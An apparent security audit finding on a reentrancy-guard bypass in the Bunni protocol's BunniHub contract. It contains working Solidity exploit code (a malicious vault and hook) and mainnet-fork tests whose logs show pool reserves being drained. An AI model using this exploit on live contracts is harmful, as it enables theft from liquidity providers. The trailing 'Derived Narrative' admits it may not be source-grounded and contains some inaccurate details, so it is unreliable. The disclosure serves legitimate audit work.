---
id: 25
severity: "High"
---

# Pools configured with a malicious hook can bypass the `BunniHub` re-entrancy guard to drain all raw balances and vault reserves of legitimate pools

## Description

** The `BunniHub` is the main contract that both holds and accounts the raw balances and  vault reserves that each pool has deposited. It inherits `ReentrancyGuard` which implements the `nonReentrant` modifier:

```solidity
modifier nonReentrant() {
    _nonReentrantBefore();
    _;
    _nonReentrantAfter();
}

function _nonReentrantBefore() internal {
    uint256 statusSlot = STATUS_SLOT;
    uint256 status;
    /// @solidity memory-safe-assembly
    assembly {
        status := tload(statusSlot)
    }
    if (status == ENTERED) revert ReentrancyGuard__ReentrantCall();

    uint256 entered = ENTERED;
    /// @solidity memory-safe-assembly
    assembly {
        tstore(statusSlot, entered)
    }
}

function _nonReentrantAfter() internal {
    uint256 statusSlot = STATUS_SLOT;
    uint256 notEntered = NOT_ENTERED;
    /// @solidity memory-safe-assembly
    assembly {
        tstore(statusSlot, notEntered)
    }
}
```

During the rebalance of a Bunni pool, it is intended to separate this re-entrancy logic into before/after hooks. These functions re-use the same global re-entrancy guard transient storage slot to lock the `BunniHub` against any potential re-entrant execution by a malicious fulfiller:

```solidity
function lockForRebalance(PoolKey calldata key) external notPaused(6) {
    if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__BunniTokenNotInitialized();
    if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
    _nonReentrantBefore();
}

function unlockForRebalance(PoolKey calldata key) external notPaused(7) {
    if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__BunniTokenNotInitialized();
    if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
    _nonReentrantAfter();
}
```

However, since the hook of a Bunni pool is not constrained to be the canonical `BunniHook` implementation, anyone can create a malicious hook that calls `unlockForRebalance()` directly to unlock the reentrancy guard:

```solidity
function deployBunniToken(HubStorage storage s, Env calldata env, IBunniHub.DeployBunniTokenParams calldata params)
    external
    returns (IBunniToken token, PoolKey memory key)
{
    ...

    // ensure hook params are valid
    if (address(params.hooks) == address(0)) revert BunniHub__HookCannotBeZero();
    if (!params.hooks.isValidParams(params.hookParams)) revert BunniHub__InvalidHookParams();

    ...
}
```

The consequence of this behavior is that the re-entrancy protection is bypassed for all `BunniHub` functions to which the `nonReentrant` modifier is applied. This is especially problematic for `hookHandleSwap()` which allows the calling hook to deposit and withdraw funds accounted to the corresponding pool. To summarise, this function:
1. Caches raw balances and vault reserves.
2. Transfers ERC-6909 input tokens from the hook to the `BunniHub`.
3. Attempts to transfer ERC-6909 output tokens to the hook and withdraws reserves from the specified vault if it has insufficient raw balance.
4. Attempts to reach `targetRawbalance` for `token0` by depositing or withdrawing funds to/from the corresponding vault.
5. Attempts to reach `targetRawbalance` for `token1` by depositing or withdrawing funds to/from the corresponding vault.
6. Updates the storage state by **setting**, rather than incrementing or decrementing, the cached raw balances and vault reserves.

Initially, it does not appear possible to re-enter due to transfers in ERC-6909 tokens; however, the possibility exists to create a malicious vault that, upon attempting to reach the `targetRawBalance` using the deposit or withdraw functions, routes execution back to the hook in order to re-enter the function. Given the pool storage state is cached and updated at the end of execution, it is possible for the hook to withdraw up to its accounted balance on each re-entrant invocation. After a sufficiently large recurson depth, the state will be updated by setting the storage variables to the cached state, bypassing any underflow due to insufficient funds accounted to the hook.

A very similar attack vector is present in the `withdraw()` function, in which re-entrant calls to recursively burn a fraction of malicious pool shares can access more than the accounted hook balances. This is again possible because intermediate execution is over the cached pool state which is updated only after each external call to the vault(s). If the vault corresponding to `token0` is malicious, unlocks the `BunniHub` through a malicious hook as described above, and then attempts to withdraw a smaller fraction of the Bunni share tokens such that the total burned amount does not overflow the available balance, the entire `token1` reserve can be drained.

```solidity
    function withdraw(HubStorage storage s, Env calldata env, IBunniHub.WithdrawParams calldata params)
        external
        returns (uint256 amount0, uint256 amount1)
    {
        /// -----------------------------------------------------------------------
        /// Validation
        /// -----------------------------------------------------------------------

        if (!params.useQueuedWithdrawal && params.shares == 0) revert BunniHub__ZeroInput();

        PoolId poolId = params.poolKey.toId();
@>      PoolState memory state = getPoolState(s, poolId);

        ...

        uint256 currentTotalSupply = state.bunniToken.totalSupply();
        uint256 shares;

        // burn shares
        if (params.useQueuedWithdrawal) {
            ...
        } else {
            shares = params.shares;
            state.bunniToken.burn(msgSender, shares);
        }
        // at this point of execution we know shares <= currentTotalSupply
        // since otherwise the burn() call would've reverted

        // compute token amount to withdraw and the component amounts

        uint256 reserveAmount0 =
            getReservesInUnderlying(state.reserve0.mulDiv(shares, currentTotalSupply), state.vault0);
        uint256 reserveAmount1 =
            getReservesInUnderlying(state.reserve1.mulDiv(shares, currentTotalSupply), state.vault1);

        uint256 rawAmount0 = state.rawBalance0.mulDiv(shares, currentTotalSupply);
        uint256 rawAmount1 = state.rawBalance1.mulDiv(shares, currentTotalSupply);

        amount0 = reserveAmount0 + rawAmount0;
        amount1 = reserveAmount1 + rawAmount1;

        if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
            revert BunniHub__SlippageTooHigh();
        }

        // decrease idle balance proportionally to the amount removed
        {
            (uint256 balance, bool isToken0) = IdleBalanceLibrary.fromIdleBalance(state.idleBalance);
            uint256 newBalance = balance - balance.mulDiv(shares, currentTotalSupply);
            if (newBalance != balance) {
                s.idleBalance[poolId] = newBalance.toIdleBalance(isToken0);
            }
        }

        /// -----------------------------------------------------------------------
        /// External calls
        /// -----------------------------------------------------------------------

        // withdraw reserve tokens
        if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
            // vault used
            // withdraw reserves
@>          uint256 reserveChange = _withdrawVaultReserve(
                reserveAmount0, params.poolKey.currency0, state.vault0, params.recipient, env.weth
            );
            s.reserve0[poolId] = state.reserve0 - reserveChange;
        }
        if (address(state.vault1) != address(0) && reserveAmount1 != 0) {
            // vault used
            // withdraw from reserves
@>          uint256 reserveChange = _withdrawVaultReserve(
                reserveAmount1, params.poolKey.currency1, state.vault1, params.recipient, env.weth
            );
            s.reserve1[poolId] = state.reserve1 - reserveChange;
        }

        // withdraw raw tokens
        env.poolManager.unlock(
            abi.encode(
                BunniHub.UnlockCallbackType.WITHDRAW,
                abi.encode(params.recipient, params.poolKey, rawAmount0, rawAmount1)
            )
        );

        ...
    }
```

This vector is notably more straightforward as the pulled reserve tokens are transferred immediately to the caller:

```solidity
function _withdrawVaultReserve(uint256 amount, Currency currency, ERC4626 vault, address user, WETH weth)
    internal
    returns (uint256 reserveChange)
{
    if (currency.isAddressZero()) {
        // withdraw WETH from vault to address(this)
        reserveChange = vault.withdraw(amount, address(this), address(this));

        // burn WETH for ETH
        weth.withdraw(amount);

        // transfer ETH to user
        user.safeTransferETH(amount);
    } else {
        // normal ERC20
        reserveChange = vault.withdraw(amount, user, address(this));
    }
}
```

A slightly less impactful but still critical alternative would be for a malicious fulfiller of a Flood Plain rebalance order to re-enter during the `IFulfiller::sourceConsideration` call. This assumes that the attacker holds the top bid and is set as the am-AMM manager. It is equivalent to the Pashov Group finding C-03 and remains possible despite the implementation of the recommended mitigation due to the re-entrancy guard override described above.

** Both vault reserves and raw balances from all legitimate pools can be fully withdrawn by a completely isolated and malicious pool configured with a custom hook that bypasses the `BunniHub` re-entrancy guard. At the time of this audit and associated disclosure, these funds were valued at $7.33M.

## Proof of Concept

** To run the following PoCs:
* Add the following malicious vault implementation inside `test/mocks/ERC4626Mock.sol`:

```solidity
interface MaliciousHook {
    function continueAttackFromMaliciousVault() external;
}

contract MaliciousERC4626 is ERC4626 {
    address internal immutable _asset;
    MaliciousHook internal immutable maliciousHook;
    bool internal attackStarted;

    constructor(IERC20 asset_, address _maliciousHook) {
        _asset = address(asset_);
        maliciousHook = MaliciousHook(_maliciousHook);
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }

    function setupAttack() external {
        attackStarted = true;
    }

    function previewRedeem(uint256 shares) public view override returns (uint256 assets) {
        return type(uint128).max;
    }

    function withdraw(uint256 assets, address to, address owner) public override returns(uint256 shares){
        if(attackStarted) {
            maliciousHook.continueAttackFromMaliciousVault();
        } else {
            return super.withdraw(assets, to, owner);
        }
    }

    function deposit(uint256 assets, address to) public override returns(uint256 shares){
        if(attackStarted) {
            maliciousHook.continueAttackFromMaliciousVault();
        } else {
            return super.deposit(assets, to);
        }
    }
}
```

This vault implementation is just a normal ERC-4626 that can be switched into forwarding the execution to a malicious hook during withdraw and deposit functions. These are the methods that the `BunniHub` will use in order to reach the `targetRawBalance`.

* Inside `test/BaseTest.sol`, change the following import:

```diff
--	import {ERC4626Mock} from "./mocks/ERC4626Mock.sol";
++	import {ERC4626Mock, MaliciousERC4626} from "./mocks/ERC4626Mock.sol";
```

* Inside `test/BunniHub.t.sol`, paste the following malicious hook contract outside of the `BunniHubTest` contract:

```solidity
import {IAmAmm} from "biddog/interfaces/IAmAmm.sol";

enum Vector {
    HOOK_HANDLE_SWAP,
    WITHDRAW
}

contract CustomHook {
    uint256 public reentrancyIterations;
    uint256 public iterationsCounter;
    IBunniHub public hub;
    PoolKey public key;
    address public vault;
    Vector public vec;
    uint256 public amountOfReservesToWithdraw;
    uint256 public sharesToWithdraw;
    IPoolManager public poolManager;
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    function isValidParams(bytes calldata hookParams) external pure returns (bool) {
        return true;
    }

    function slot0s(PoolId id)
        external
        view
        returns (uint160 sqrtPriceX96, int24 tick, uint32 lastSwapTimestamp, uint32 lastSurgeTimestamp)
    {
        int24 minTick = TickMath.MIN_TICK;
        (sqrtPriceX96, tick, lastSwapTimestamp, lastSurgeTimestamp) = (TickMath.getSqrtPriceAtTick(tick), tick, 0, 0);
    }

    function getTopBidWrite(PoolId id) external view returns (IAmAmm.Bid memory topBid) {
        topBid = IAmAmm.Bid({manager: address(0), blockIdx: 0, payload: 0, rent: 0, deposit: 0});
    }

    function getAmAmmEnabled(PoolId id) external view returns (bool) {
        return false;
    }

    function canWithdraw(PoolId id) external view returns (bool) {
        return true;
    }

    function afterInitialize(address caller, PoolKey calldata key, uint160 sqrtPriceX96, int24 tick)
        external
        returns (bytes4)
    {
        return BunniHook.afterInitialize.selector;
    }

    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
        external
        returns (bytes4, int256, uint24)
    {
        return (BunniHook.beforeSwap.selector, 0, 0);
    }

    function depositInitialReserves(
        address token,
        uint256 amount,
        address _hub,
        IPoolManager _poolManager,
        PoolKey memory _key,
        bool zeroForOne
    ) external {
        key = _key;
        hub = IBunniHub(_hub);
        poolManager = _poolManager;
        poolManager.setOperator(_hub, true);
        poolManager.unlock(abi.encode(uint8(0), token, amount, msg.sender, zeroForOne));
        poolManager.unlock(abi.encode(uint8(1), address(0), amount, msg.sender, zeroForOne));
    }

    function mintERC6909(address token, uint256 amount) external {
        poolManager.unlock(abi.encode(uint8(0), token, amount, msg.sender, true));
    }

    function mintBunniToken(PoolKey memory _key, uint256 _amount0, uint256 _amount1)
        external
        returns (uint256 shares)
    {
        IERC20(Currency.unwrap(_key.currency0)).transferFrom(msg.sender, address(this), _amount0);
        IERC20(Currency.unwrap(_key.currency1)).transferFrom(msg.sender, address(this), _amount1);

        IERC20(Currency.unwrap(_key.currency0)).approve(address(PERMIT2), _amount0);
        IERC20(Currency.unwrap(_key.currency1)).approve(address(PERMIT2), _amount1);
        PERMIT2.approve(Currency.unwrap(_key.currency0), address(hub), uint160(_amount0), type(uint48).max);
        PERMIT2.approve(Currency.unwrap(_key.currency1), address(hub), uint160(_amount1), type(uint48).max);

        (shares,,) = IBunniHub(hub).deposit(
            IBunniHub.DepositParams({
                poolKey: _key,
                amount0Desired: _amount0,
                amount1Desired: _amount1,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                recipient: address(this),
                refundRecipient: address(this),
                vaultFee0: 0,
                vaultFee1: 0,
                referrer: address(0)
            })
        );
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory result) {
        (uint8 mode, address token, uint256 amount, address spender, bool zeroForOne) =
            abi.decode(data, (uint8, address, uint256, address, bool));
        if (mode == 0) {
            poolManager.sync(Currency.wrap(token));
            IERC20(token).transferFrom(spender, address(poolManager), amount);
            uint256 deltaAmount = poolManager.settle();
            poolManager.mint(address(this), Currency.wrap(token).toId(), deltaAmount);
        } else if (mode == 1) {
            hub.hookHandleSwap(key, zeroForOne, amount, 0);
        } else if (mode == 2) {
            hub.hookHandleSwap(key, false, 1, amountOfReservesToWithdraw);
        }
    }

    function initiateAttack(
        IBunniHub _hub,
        PoolKey memory _key,
        address _targetVault,
        uint256 _amountToWithdraw,
        Vector _vec,
        uint256 iterations
    ) public {
        reentrancyIterations = iterations;
        hub = _hub;
        key = _key;
        vault = _targetVault;
        vec = _vec;
        if (vec == Vector.HOOK_HANDLE_SWAP) {
            amountOfReservesToWithdraw = _amountToWithdraw;
            poolManager.unlock(abi.encode(uint8(2), address(0), amountOfReservesToWithdraw, msg.sender, true));
        } else if (vec == Vector.WITHDRAW) {
            sharesToWithdraw = _amountToWithdraw;
            hub.withdraw(
                IBunniHub.WithdrawParams({
                    poolKey: _key,
                    recipient: address(this),
                    shares: sharesToWithdraw,
                    amount0Min: 0,
                    amount1Min: 0,
                    deadline: block.timestamp,
                    useQueuedWithdrawal: false
                })
            );
        }
    }

    function continueAttackFromMaliciousVault() public {
        if (iterationsCounter != reentrancyIterations) {
            iterationsCounter++;
            disableReentrancyGuard();

            if (vec == Vector.HOOK_HANDLE_SWAP) {
                hub.hookHandleSwap(
                    key, false, 1, /* amountToDeposit to trigger the updateIfNeeded */ amountOfReservesToWithdraw
                );
            } else if (vec == Vector.WITHDRAW) {
                sharesToWithdraw /= 2;

                hub.withdraw(
                    IBunniHub.WithdrawParams({
                        poolKey: key,
                        recipient: address(this),
                        shares: sharesToWithdraw,
                        amount0Min: 0,
                        amount1Min: 0,
                        deadline: block.timestamp,
                        useQueuedWithdrawal: false
                    })
                );
            }
        }
    }

    function disableReentrancyGuard() public {
        hub.unlockForRebalance(key);
    }

    fallback() external payable {}
}
```

* With all of the above, this test can be run from inside `test/BunniHub.t.sol`:

```solidity
function test_ForkHookHandleSwapDrainRawBalancePoC() public {
    uint256 mainnetFork;
    string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    mainnetFork = vm.createFork(MAINNET_RPC_URL);
    vm.selectFork(mainnetFork);
    vm.rollFork(22347121);

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDCVault = 0x3b028b4b6c567eF5f8Ca1144Da4FbaA0D973F228; // Euler vault

    IERC20 token0 = IERC20(USDC);
    IERC20 token1 = IERC20(WETH);
    poolManager = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    hub = IBunniHub(0x000000DCeb71f3107909b1b748424349bfde5493);
    bunniHook = BunniHook(payable(0x0010d0D5dB05933Fa0D9F7038D365E1541a41888));

    // 1. Create the malicious pool linked to the malicious hook
    bytes32 salt;
    unchecked {
        bytes memory creationCode = abi.encodePacked(type(CustomHook).creationCode);
        uint256 offset;
        while (true) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (uint160(bytes20(deployed)) & Hooks.ALL_HOOK_MASK == HOOK_FLAGS && deployed.code.length == 0) {
                break;
            }
            offset++;
        }
    }
    address customHook = address(new CustomHook{salt: salt}());

    // 2. Create the malicious vault
    MaliciousERC4626 maliciousVault = new MaliciousERC4626(token1, customHook);
    token1.approve(address(maliciousVault), type(uint256).max);
    deal(address(token1), address(maliciousVault), 1 ether);

    // 3. Register the malicious pool to steal reserve balances
    (, PoolKey memory maliciousKey) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: new MockLDF(address(hub), address(customHook), address(quoter)),
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.STATIC,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            hooks: BunniHook(payable(customHook)),
            hookParams: "",
            vault0: ERC4626(address(USDCVault)),
            vault1: ERC4626(address(maliciousVault)),
            minRawTokenRatio0: 1e6,         // set to 100% to have all funds in raw balance
            targetRawTokenRatio0: 1e6,      // set to 100% to have all funds in raw balance
            maxRawTokenRatio0: 1e6,         // set to 100% to have all funds in raw balance
            minRawTokenRatio1: 0,           // set to 0% to trigger a deposit upon transferring 1 token
            targetRawTokenRatio1: 0,        // set to 0% to trigger a deposit upon transferring 1 token
            maxRawTokenRatio1: 0,           // set to 0% to trigger a deposit upon transferring 1 token
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("MaliciousBunniToken"),
            symbol: bytes32("BAD-BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(keccak256("malicious"))
        })
    );

    // 4. Make a deposit to the malicious pool to have accounted some reserves of vault0 and initiate attack
    uint256 initialToken0Deposit = 10_000e6; // Using a big amount in order to not execute too many reentrancy iterations, but it works with whatever amount
    deal(address(token0), address(this), initialToken0Deposit);
    deal(address(token1), address(this), initialToken0Deposit);
    token0.approve(customHook, initialToken0Deposit);
    token1.approve(customHook, initialToken0Deposit);
    CustomHook(payable(customHook)).depositInitialReserves(
        address(token0), initialToken0Deposit, address(hub), poolManager, maliciousKey, true
    );
    CustomHook(payable(customHook)).mintERC6909(address(token1), initialToken0Deposit);

    console.log(
        "BunniHub token0 raw balance before",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token0)).toId())
    );
    console.log("BunniHub token0 vault reserve before", ERC4626(USDCVault).balanceOf(address(hub)));
    console.log(
        "MaliciousHook token0 balance before",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId())
    );
    maliciousVault.setupAttack();
    CustomHook(payable(customHook)).initiateAttack(
        IBunniHub(address(hub)),
        maliciousKey,
        USDCVault,
        initialToken0Deposit,
        Vector.HOOK_HANDLE_SWAP,
        20
    );
    console.log(
        "BunniHub token0 raw balance after",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token0)).toId())
    );
    console.log("BunniHub token0 vault reserve after", ERC4626(USDCVault).balanceOf(address(hub)));
    console.log(
        "MaliciousHook token0 balance after",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId())
    );
    console.log(
        "Stolen USDC",
        poolManager.balanceOf(customHook, Currency.wrap(address(token0)).toId()) - initialToken0Deposit
    );
}
```

The execution does the following:
1. Calls `depositInitialReserves()` from the malicious hook which essentially deposits and accounts some raw balance into `BunniHub`.
2. Calls the `hookHandleSwap()` function inside `BunniHub` to withdraw the previously deposited amount.
3. The `BunniHub` transfers the tokens to the hook.
4. The `hookHandleSwap()` tries to reach the `targetRawBalance` of token1 and calls the `deposit()` into the malicious vault which forwards the execution back to the malicious hook.
5. The malicious hook calls the `unlockForRebalance()` function to disable the reentrancy protection.
6. The malicious hook reenters the `hookHandleSwap()` function the same way as step 2.

Once the function has been re-entered a sufficient number of times to drain all raw balances, the state will be set to 0 instead of decrementing, avoiding an underflow. The end result will be the malicious hook owning all ERC-6909 tokens previously held by the `BunniHub`.

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_ForkHookHandleSwapDrainRawBalancePoC() (gas: 20540027)
Logs:
  BunniHub token0 raw balance before 219036268296
  BunniHub token0 vault reserve before 388807745471
  MaliciousHook token0 balance before 0
  BunniHub token0 raw balance after 9036268296
  BunniHub token0 vault reserve after 388807745471
  MaliciousHook token0 balance after 210000000000
  Stolen USDC 200000000000
```

It is also possible to drain all vault reserves held by the `BunniHub` by modifying the token ratio bounds of the malicious hook as follows:

```solidity
minRawTokenRatio0: 0,           // set to 0% in order to have all deposited funds accounted into the vault
targetRawTokenRatio0: 0,        // set to 0% in order to have all deposited funds accounted into the vault
maxRawTokenRatio0: 0,           // set to 0% in order to have all deposited funds accounted into the vault
```

With this modification, the target raw balance for the vault to drain is set to 0% in order to have all the liquidity accounted into the vault. This way, when the `BunniHub` attempts to transfer the funds to the hook, it will have to withdraw the funds from the vault which can be exploited to repeatedly burn vault shares from other pools.

The attack setup should also be modified slightly to calculate the optimal number of iterations:

```solidity
uint256 sharesToMint = ERC4626(USDCVault).previewDeposit(initialToken0Deposit) - 1e6;
CustomHook(payable(customHook)).initiateAttack(
    IBunniHub(address(hub)),
    maliciousKey,
    USDCVault,
    sharesToMint,
    Vector.HOOK_HANDLE_SWAP,
    ERC4626(USDCVault).balanceOf(address(hub)) / sharesToMint
);

Output:
```bash
Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] test_ForkHookHandleSwapDrainReserveBalancePoC() (gas: 23881409)
Logs:
  BunniHub token0 raw balance before 209036268296
  BunniHub token0 vault reserve before 398583692087
  MaliciousHook token0 balance before 0
  BunniHub token0 raw balance after 209036268296
  BunniHub token0 vault reserve after 6790331257
  MaliciousHook token0 balance after 400772811256
  Stolen USDC 390772811256
```

A similar attack can be executed through withdrawal of malicious Bunni token shares as shown in the PoC below:

```solidity
function test_ForkWithdrawPoC() public {
    uint256 mainnetFork;
    string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    mainnetFork = vm.createFork(MAINNET_RPC_URL);
    vm.selectFork(mainnetFork);
    vm.rollFork(22347121);

    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address USDCVault = 0x3b028b4b6c567eF5f8Ca1144Da4FbaA0D973F228; // Euler vault

    IERC20 token0 = IERC20(WETH);
    IERC20 token1 = IERC20(USDC);

    while (address(token0) > address(token1)) {
        token0 = IERC20(address(new ERC20Mock()));
    }

    poolManager = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    hub = IBunniHub(0x000000DCeb71f3107909b1b748424349bfde5493);
    bunniHook = BunniHook(payable(0x0010d0D5dB05933Fa0D9F7038D365E1541a41888));

    // 1. Create the malicious pool linked to the malicious hook
    bytes32 salt;
    unchecked {
        bytes memory creationCode = abi.encodePacked(type(CustomHook).creationCode);
        uint256 offset;
        while (true) {
            salt = bytes32(offset);
            address deployed = computeAddress(address(this), salt, creationCode);
            if (uint160(bytes20(deployed)) & Hooks.ALL_HOOK_MASK == HOOK_FLAGS && deployed.code.length == 0) {
                break;
            }
            offset++;
        }
    }
    address customHook = address(new CustomHook{salt: salt}());

    // 2. Create the malicious vault
    MaliciousERC4626 maliciousVault = new MaliciousERC4626(token0, customHook);
    token1.approve(address(maliciousVault), type(uint256).max);
    deal(address(token1), address(maliciousVault), 1 ether);

    // 3. Register the malicious pool
    (, PoolKey memory maliciousKey) = hub.deployBunniToken(
        IBunniHub.DeployBunniTokenParams({
            currency0: Currency.wrap(address(token0)),
            currency1: Currency.wrap(address(token1)),
            tickSpacing: TICK_SPACING,
            twapSecondsAgo: TWAP_SECONDS_AGO,
            liquidityDensityFunction: new MockLDF(address(hub), address(customHook), address(quoter)),
            hooklet: IHooklet(address(0)),
            ldfType: LDFType.STATIC,
            ldfParams: bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            hooks: BunniHook(payable(customHook)),
            hookParams: "",
            vault0: ERC4626(address(maliciousVault)),
            vault1: ERC4626(address(USDCVault)),
            minRawTokenRatio0: 0,
            targetRawTokenRatio0: 0,
            maxRawTokenRatio0: 0,
            minRawTokenRatio1: 0,
            targetRawTokenRatio1: 0,
            maxRawTokenRatio1: 0,
            sqrtPriceX96: TickMath.getSqrtPriceAtTick(4),
            name: bytes32("MaliciousBunniToken"),
            symbol: bytes32("BAD-BUNNI-LP"),
            owner: address(this),
            metadataURI: "metadataURI",
            salt: bytes32(keccak256("malicious"))
        })
    );

    // 4. Make a deposit to the malicious pool to have accounted some reserves of vault0 and initiate attack
    uint256 initialToken0Deposit = 50_000 ether;
    uint256 initialToken1Deposit = 50_000e6;
    deal(address(token0), address(this), 2 * initialToken0Deposit);
    deal(address(token1), address(this), 2 * initialToken0Deposit);
    token0.approve(customHook, 2 * initialToken0Deposit);
    token1.approve(customHook, 2 * initialToken0Deposit);
    CustomHook(payable(customHook)).depositInitialReserves(
        address(token1), initialToken1Deposit, address(hub), poolManager, maliciousKey, false
    );
    CustomHook(payable(customHook)).mintERC6909(address(token0), initialToken0Deposit);
    uint256 shares =
        CustomHook(payable(customHook)).mintBunniToken(maliciousKey, initialToken0Deposit, initialToken1Deposit);

    console.log(
        "BunniHub token1 raw balance before",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token1)).toId())
    );
    console.log("BunniHub token1 vault reserve before", ERC4626(USDCVault).maxWithdraw(address(hub)));
    uint256 hookBalanceBefore = token1.balanceOf(customHook);
    console.log("MaliciousHook token1 balance before", hookBalanceBefore);

    maliciousVault.setupAttack();
    CustomHook(payable(customHook)).initiateAttack(
        IBunniHub(address(hub)), maliciousKey, USDCVault, shares / 2, Vector.WITHDRAW, 17
    );
    console.log(
        "BunniHub token1 raw balance after",
        poolManager.balanceOf(address(hub), Currency.wrap(address(token1)).toId())
    );
    console.log("BunniHub token1 vault reserve after", ERC4626(USDCVault).maxWithdraw(address(hub)));
    console.log("MaliciousHook token1 balance after", token1.balanceOf(customHook));
    console.log("USDC stolen", token1.balanceOf(customHook) - initialToken1Deposit);
}
```

Logs:
```bash
[PASS] test_ForkWithdrawPoC() (gas: 23086872)
Logs:
  BunniHub token1 raw balance before 209036268296
  BunniHub token1 vault reserve before 447718769054
  MaliciousHook token1 balance before 50000000000
  BunniHub token1 raw balance after 209036268296
  BunniHub token1 vault reserve after 3757038234
  MaliciousHook token1 balance after 493961730811
  USDC stolen 443961730811
```

## Recommendation

** The root cause of the attack was the ability to disable the intended global re-entrancy protection by invoking `unlockForRebalance()` which was subsequently disabled. One solution would be to implement the rebalance re-entrancy protection on a per-pool basis such that one pool cannot manipulate the re-entrancy guard transient storage state of another. Additionally, allowing Bunni pools to be deployed with any arbitrary hook implementation greatly increases the attack surface. It is instead recommended to minimise this by constraining the hook to be the canonical `BunniHook` implementation such that it is not possible to call such `BunniHub` functions directly.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the BunniHub contract, which is the central accounting component for raw token balances and vault reserves of every Bunni pool. BunniHub inherits OpenZeppelin's ReentrancyGuard and protects its external functions with the nonReentrant modifier, which uses a single transient storage slot (STATUS_SLOT) to record whether the contract is currently entered. During a pool rebalance the hub expects the pool’s hook to call lockForRebalance() before performing any state‑changing actions and unlockForRebalance() after they complete. The lock/unlock functions simply invoke the internal _nonReentrantBefore/_nonReentrantAfter helpers, re‑using the same global lock slot. Because the hook address is not constrained to the canonical BunniHook implementation, an attacker can deploy a malicious hook that calls unlockForRebalance() at any time, thereby clearing the global re‑entrancy flag without having called lockForRebalance() first. This effectively disables the guard for the remainder of the transaction.

With the guard disabled, the attacker’s hook can re‑enter any BunniHub function that is protected by nonReentrant, most notably hookHandleSwap() and withdraw(). Both functions cache the pool’s raw balances and vault reserves at the start of execution, perform external calls to ERC‑4626 vaults to deposit or withdraw tokens in order to reach a target raw balance, and only update the cached state at the end. By using a malicious vault that, during its deposit or withdraw callback, calls back into the hook (which in turn disables the re‑entrancy guard), the attacker can trigger a recursive call to hookHandleSwap() or withdraw() before the cached state is written back. Each recursive iteration can withdraw the amount that was previously accounted for the hook, and because the final state write simply overwrites the cached values rather than incrementally adjusting them, the contract ends up recording a zero balance even though more funds were taken. Repeating this recursion enough times drains all raw balances and/or all vault reserves for every legitimate pool.

The attack scenario proceeds as follows: (1) an attacker creates a new Bunni pool specifying a custom hook contract they control; (2) the attacker also deploys a malicious ERC‑4626 vault whose deposit/withdraw functions forward execution to the hook; (3) the attacker deposits a small amount of tokens to make the pool’s accounting state non‑zero; (4) the attacker initiates a hookHandleSwap() (or withdraw()) which causes the hub to interact with the malicious vault; (5) during the vault callback the hook invokes unlockForRebalance(), clearing the re‑entrancy flag; (6) the hook immediately calls hookHandleSwap() (or withdraw()) again, re‑entering the function before the previous call’s cached state is committed; (7) each re‑entrancy iteration extracts the hook’s entitled portion of the pool’s raw balance or vault reserve; (8) after a sufficient recursion depth the hub’s final state write sets the balances to the stale cached values, effectively erasing the drained amounts; (9) the attacker ends the transaction with all tokens transferred to their address. The proof‑of‑concept demonstrates that both raw token balances and vault reserves of all pools can be completely siphoned, amounting to over $7 million at the time of disclosure.

The flaw is triggered whenever a pool’s hook is executed during a rebalance, swap handling, or withdrawal – essentially any time the hub calls out to external contracts. All liquidity providers, traders, and the protocol itself are affected because the drained assets belong to the hub’s global accounting, not to a single pool. The issue was discovered during a formal security audit; it is subtle because the nonReentrant modifier appears to be in place, yet the separate lock/unlock calls expose a bypass that is not obvious from a surface‑level review. Detecting it requires understanding that the guard’s state is global and can be cleared independently of the lock call.

Mitigation requires moving the re‑entrancy protection to a per‑pool context so that one pool cannot manipulate the lock used by another, and restricting pool deployment to the approved BunniHook implementation (or otherwise ensuring that only trusted code can call unlockForRebalance). Additionally, the hub should enforce that unlockForRebalance can only be called after a matching lockForRebalance within the same execution context, or eliminate the separate lock/unlock pattern altogether and rely solely on the nonReentrant modifier. These changes would prevent a malicious hook from disabling the guard and stop the recursive extraction of funds.
